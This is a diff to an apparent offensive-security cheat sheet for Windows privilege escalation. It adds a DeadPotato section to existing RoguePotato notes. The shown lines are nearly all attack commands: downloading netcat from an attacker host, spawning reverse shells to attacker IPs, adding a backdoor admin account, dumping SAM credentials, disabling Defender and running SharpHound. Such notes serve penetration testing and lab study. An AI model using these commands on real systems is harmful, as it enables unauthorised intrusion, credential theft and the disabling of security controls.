@@ -293,3 +293,18 @@ iwr -uri http://attacker_ip/nc64.exe -outfile nc.exe
 RoguePotato.exe -r kali_ip -e "cmd /c C:\Users\Public\nc.exe -e cmd kali_ip 4444" -l 9999
 ```
 
+### DeadPotato
+
+
+
+```powershell
+# https://github.com/lypd0/DeadPotato
+   -> deadpotato.exe -cmd "whoami"
+   -> deadpotato.exe -rev 192.168.10.30:9001
+   -> deadpotato.exe -exe paylod.exe
+   -> deadpotato.exe -newadmin lypd0:DeadPotatoRocks1
+   -> deadpotato.exe -shell
+   -> deadpotato.exe -mimi sam
+   -> deadpotato.exe -defender off
+   -> deadpotato.exe -sharphound
+```
